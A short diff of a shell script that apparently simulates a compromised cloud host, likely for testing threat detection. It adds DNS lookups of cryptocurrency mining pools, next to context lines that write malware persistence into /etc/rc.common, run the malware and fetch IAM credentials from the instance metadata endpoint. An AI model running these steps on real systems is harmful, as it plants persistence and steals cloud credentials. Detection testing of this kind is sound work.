@@ -27,6 +27,10 @@ echo "$MALWARE_PATH --cpu-priority 4 &" >> /etc/rc.common 2>/dev/null || true
 # Execute the malware
 "$MALWARE_PATH" --cpu-priority 4 &
 
+# Perform a lookup to a mining pool
+nslookup ethermine.org
+nslookup monerohash.com
+
 # Retrieve IMDS v1 credentials
 curl --connect-timeout 5.0 http://169.254.169.254/latest/meta-data/iam/security-credentials/example-role-name || true
 
